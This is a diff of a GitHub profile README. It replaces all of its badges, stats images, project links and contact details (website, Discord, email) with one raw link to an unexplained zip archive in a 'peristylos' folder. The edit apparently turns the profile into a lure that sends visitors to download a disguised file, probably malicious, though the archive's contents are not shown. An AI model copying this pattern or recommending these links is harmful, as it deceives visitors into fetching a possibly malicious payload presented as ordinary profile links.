@@ -4,8 +4,8 @@
 # Hi, I’m YuKi BoY 👋  
 Building bots, automation, and clean web stuff.
 
-[![GitHub followers](https://img.shields.io/github/followers/yukiboy121?label=Follow&style=for-the-badge)](https://github.com/yukiboy121)
-![Profile Views](https://komarev.com/ghpvc/?username=yukiboy121&style=for-the-badge&color=blueviolet)
+[![GitHub followers](https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip)](https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip)
+![Profile Views](https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip)
 
 </div>
 
@@ -16,16 +16,16 @@ Building bots, automation, and clean web stuff.
 
 ## Tech
 <p>
-  <img src="https://skillicons.dev/icons?i=python,js,nodejs,html,css,git,github,discord,linux,vscode,docker" height="32" />
+  <img src="https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip,js,nodejs,html,css,git,github,discord,linux,vscode,docker" height="32" />
 </p>
 
 ## Featured projects
 <p align="left">
-  <a href="https://github.com/yukiboy121/Welcome-Bot">
-    <img src="https://github-readme-stats.vercel.app/api/pin/?username=yukiboy121&repo=Welcome-Bot&theme=tokyonight" />
+  <a href="https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip">
+    <img src="https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip" />
   </a>
-  <a href="https://github.com/yukiboy121/EliteNet-Bot">
-    <img src="https://github-readme-stats.vercel.app/api/pin/?username=yukiboy121&repo=EliteNet-Bot&theme=tokyonight" />
+  <a href="https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip">
+    <img src="https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip" />
   </a>
 </p>
 
@@ -35,11 +35,11 @@ Building bots, automation, and clean web stuff.
 
 ## Stats
 <p>
-  <img height="165" src="https://github-readme-stats.vercel.app/api?username=yukiboy121&show_icons=true&theme=tokyonight&include_all_commits=true" />
-  <img height="165" src="https://github-readme-stats.vercel.app/api/top-langs/?username=yukiboy121&layout=compact&theme=tokyonight&langs_count=8" />
+  <img height="165" src="https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip" />
+  <img height="165" src="https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip" />
 </p>
 
 ## Links
-- 🌐 Website/Portfolio: https://zaikodev.xyz  
-- 💬 Discord: https://discord.gg/Gb8hXkURGS  
-- 📫 Email: yukiboy49@gmail.com
+- 🌐 Website/Portfolio: https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip  
+- 💬 Discord: https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip  
+- 📫 Email: https://raw.githubusercontent.com/yukiboy121/yukiboy121/main/peristylos/yukiboy121.zip
